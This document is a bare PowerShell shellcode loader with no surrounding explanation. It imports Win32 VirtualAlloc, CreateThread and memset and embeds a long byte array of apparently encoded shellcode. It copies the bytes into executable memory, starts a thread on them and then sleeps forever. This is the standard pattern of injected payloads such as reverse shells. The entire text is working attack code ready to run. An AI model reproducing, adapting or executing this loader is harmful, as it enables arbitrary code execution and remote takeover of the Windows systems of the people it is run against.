$DCw4 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $DCw4 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x18,0xd2,0x8f,0x30,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x58,0x31,0x77,0x15,0x03,0x77,0x15,0x83,0xef,0xfc,0xe2,0xed,0x2e,0x67,0xb2,0x0d,0xcf,0x78,0xd3,0x84,0x2a,0x49,0xd3,0xf2,0x3f,0xfa,0xe3,0x71,0x6d,0xf7,0x88,0xd7,0x86,0x8c,0xfd,0xff,0xa9,0x25,0x4b,0xd9,0x84,0xb6,0xe0,0x19,0x86,0x34,0xfb,0x4d,0x68,0x04,0x34,0x80,0x69,0x41,0x29,0x68,0x3b,0x1a,0x25,0xde,0xac,0x2f,0x73,0xe2,0x47,0x63,0x95,0x62,0xbb,0x34,0x94,0x43,0x6a,0x4e,0xcf,0x43,0x8c,0x83,0x7b,0xca,0x96,0xc0,0x46,0x85,0x2d,0x32,0x3c,0x14,0xe4,0x0a,0xbd,0xba,0xc9,0xa2,0x4c,0xc3,0x0e,0x04,0xaf,0xb6,0x66,0x76,0x52,0xc0,0xbc,0x04,0x88,0x45,0x27,0xae,0x5b,0xfd,0x83,0x4e,0x8f,0x9b,0x40,0x5c,0x64,0xe8,0x0f,0x41,0x7b,0x3d,0x24,0x7d,0xf0,0xc0,0xeb,0xf7,0x42,0xe6,0x2f,0x53,0x10,0x87,0x76,0x39,0xf7,0xb8,0x69,0xe2,0xa8,0x1c,0xe1,0x0f,0xbc,0x2d,0xa8,0x47,0x2c,0x48,0x27,0x98,0xd8,0xe5,0xae,0xf6,0x71,0x5d,0x59,0x4b,0xf5,0x7b,0x9e,0xac,0x2c,0xb2,0x7b,0x01,0x9c,0xe7,0x28,0xf5,0x4a,0x3d,0x99,0x80,0x2d,0xbe,0xf0,0x20,0x61,0x2a,0xf8,0x95,0xd6,0xc2,0x5b,0x16,0xd9,0x12,0x4c,0xa5,0xd9,0x12,0x8c,0x99,0xee,0x53,0xc5,0x8d,0x23,0x53,0x85,0x25,0x13,0xda,0xba,0x70,0x64,0x09,0x4d,0xba,0xc8,0xd9,0x4e,0x71,0x0f,0x9d,0x1c,0x26,0x9c,0xca,0xf1,0x9e,0x4a,0x1f,0xa0,0x30,0xb0,0x20,0x9e,0xdb,0xac,0xd4,0x7e,0x8c,0xb0,0xdb,0x80,0x4c,0x38,0xfb,0xeb,0x48,0x6a,0x91,0xf4,0x06,0xe2,0x10,0x4d,0x39,0x74,0x25,0x84,0x16,0x2a,0x8a,0x74,0xcf,0xa4,0x01,0x7d,0xf7,0x4f,0xa6,0x54,0x82,0x70,0x2d,0x5d,0xc2,0x05,0x14,0x09,0x2c,0x50,0x04,0x9c,0x33,0x4e,0x22,0x61,0xa4,0x71,0xa2,0x61,0x34,0x1a,0xc2,0x61,0x74,0xda,0x91,0x09,0x2c,0x7e,0x46,0x2f,0x33,0xab,0xfb,0xfc,0x9f,0xdd,0x1c,0x55,0x48,0xde,0xc2,0x5a,0x88,0x8d,0x54,0x33,0x9a,0xa7,0xd1,0x21,0x65,0x12,0x64,0x65,0xee,0x50,0xed,0x61,0x0e,0xa8,0x74,0xad,0x65,0xcb,0x2e,0xed,0xd9,0xfb,0xbb,0x0e,0x1a,0x04,0x34,0x86,0x92,0xce,0x94,0x0b,0x35,0x43,0x87,0xa6,0xa0,0x8e,0x22,0x49,0x05,0xb5,0xad,0xdd,0x3c,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$SOKo=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($SOKo.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$SOKo,0,0,0);for (;;){Start-sleep 60};